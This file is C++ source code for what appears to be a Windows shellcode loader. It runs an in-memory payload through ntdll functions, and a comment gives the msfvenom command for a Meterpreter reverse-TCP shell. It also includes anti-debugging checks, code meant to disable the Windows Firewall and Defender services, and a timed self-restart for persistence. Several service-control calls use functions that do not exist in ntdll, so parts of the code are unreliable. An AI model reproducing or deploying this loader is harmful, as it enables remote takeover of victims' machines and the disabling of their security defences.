#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <wchar.h>
#include <libloaderapi.h>
#include <winsvc.h>
#include <ctime>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "winternl.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#pragma comment(lib, "libcpmt.lib")

extern "C" {
    typedef NTSTATUS(NTAPI* PFN_NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    typedef NTSTATUS(NTAPI* PFN_NtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
    typedef NTSTATUS(NTAPI* PFN_NtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesWritten);
    typedef NTSTATUS(NTAPI* PFN_NtCreateThreadEx)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
    typedef NTSTATUS(NTAPI* PFN_NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
    typedef NTSTATUS(NTAPI* PFN_NtFreeVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);

    NTSTATUS NTAPI NtOpenSCManager(PHANDLE ScManagerHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
    NTSTATUS NTAPI NtOpenService(PHANDLE ServiceHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
    NTSTATUS NTAPI NtClose(HANDLE Handle);
    NTSTATUS NTAPI NtChangeServiceConfig(HANDLE ServiceHandle, ULONG ServiceType, LPVOID ServiceStartName, ULONG ServiceErrorControl, LPVOID BinaryPathName, LPVOID LoadOrderGroup, LPDWORD TagId, LPVOID Dependencies, LPVOID ServiceStartNamePassword, LPVOID DisplayName);
}

static void logError(const std::wstring& message, NTSTATUS status) {
    std::wcerr << message << L". Error code: " << status << std::endl;
}

static NTSTATUS openSCManager(PHANDLE scManagerHandle) {
    NTSTATUS status;

    OBJECT_ATTRIBUTES objAttr = {};
    InitializeObjectAttributes(&objAttr, nullptr, 0, nullptr, nullptr);

    status = NtOpenSCManager(scManagerHandle, SC_MANAGER_ALL_ACCESS, &objAttr);
    if (!NT_SUCCESS(status)) {
        logError(L"Failed to open SC Manager", status);
    }
    return status;
}

static NTSTATUS openService(PHANDLE serviceHandle, const wchar_t* serviceName) {
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr = {};
    InitializeObjectAttributes(&objAttr, nullptr, 0, nullptr, nullptr);

    UNICODE_STRING serviceNameStr;
    RtlInitUnicodeString(&serviceNameStr, serviceName);

    status = NtOpenService(serviceHandle, SERVICE_ALL_ACCESS, &objAttr);
    if (!NT_SUCCESS(status)) {
        logError(std::wstring(L"Failed to open service '") + serviceName + L"'", status);
    }
    return status;
}

static NTSTATUS disableService(const wchar_t* serviceName) {
    HANDLE scManager = NULL;
    HANDLE service = NULL;
    NTSTATUS status;

    status = openSCManager(&scManager);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = openService(&service, serviceName);
    if (!NT_SUCCESS(status)) {
        NtClose(scManager);
        return status;
    }

    status = NtChangeServiceConfig(service, SERVICE_NO_CHANGE, NULL, SERVICE_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        logError(std::wstring(L"Failed to disable service '") + serviceName + L"'", status);
    }
    else {
        std::wcout << L"Service '" << serviceName << L"' disabled successfully." << std::endl;
    }

    NtClose(service);
    NtClose(scManager);
    return status;
}


unsigned char shellcode[] = {
    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f csharp -b "\x00\x0a\x0d" EXITFUNC=thread 

};

static bool isDebuggerPresent() {
    return ::IsDebuggerPresent();
}

static void antiAnalysisTechniques() {
    Sleep(1000);
    DWORD processId;
    GetWindowThreadProcessId(GetForegroundWindow(), &processId);
    if (processId == GetCurrentProcessId()) {
        ExitProcess(0);
    }
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }
}

static void restartProgramAfterDelay(int delaySeconds) {
    Sleep(delaySeconds * 1000);

    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(szPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "Error creating new process. Error: " << GetLastError() << std::endl;
        return;
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


int main() {
    if (isDebuggerPresent()) {
        std::cerr << "Debugger detected. Exiting..." << std::endl;
        return -1;
    }

    antiAnalysisTechniques();

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return -1;

    PFN_NtAllocateVirtualMemory NtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    PFN_NtProtectVirtualMemory NtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    PFN_NtWriteVirtualMemory NtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    PFN_NtCreateThreadEx NtCreateThreadEx = (PFN_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    PFN_NtWaitForSingleObject NtWaitForSingleObject = (PFN_NtWaitForSingleObject)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    PFN_NtFreeVirtualMemory NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(hNtdll, "NtFreeVirtualMemory");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx || !NtWaitForSingleObject || !NtFreeVirtualMemory) return -1;

    HANDLE hProcess = GetCurrentProcess();
    PVOID baseAddress = NULL;
    SIZE_T regionSize = sizeof(shellcode);

    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        logError(L"Failed to allocate virtual memory", status);
        return -1;
    }

    ULONG bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, baseAddress, shellcode, sizeof(shellcode), &bytesWritten);
    if (!NT_SUCCESS(status) || bytesWritten != sizeof(shellcode)) {
        logError(L"Failed to write virtual memory", status);
        return -1;
    }

    ULONG oldProtect;
    status = NtProtectVirtualMemory(hProcess, &baseAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status)) {
        logError(L"Failed to protect virtual memory", status);
        return -1;
    }

    HANDLE hThread;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, baseAddress, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        logError(L"Failed to create thread", status);
        return -1;
    }

    status = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (!NT_SUCCESS(status)) {
        logError(L"Failed while waiting for thread", status);
        return -1;
    }

    status = NtFreeVirtualMemory(hProcess, &baseAddress, &regionSize, MEM_RELEASE);
    if (!NT_SUCCESS(status)) {
        logError(L"Failed to free virtual memory", status);
        return -1;
    }

    CloseHandle(hThread);

    disableService(L"WindowsFirewall");
    disableService(L"WinDefend");

    int delaySeconds = 3600;
    restartProgramAfterDelay(delaySeconds);


    return 0;
}

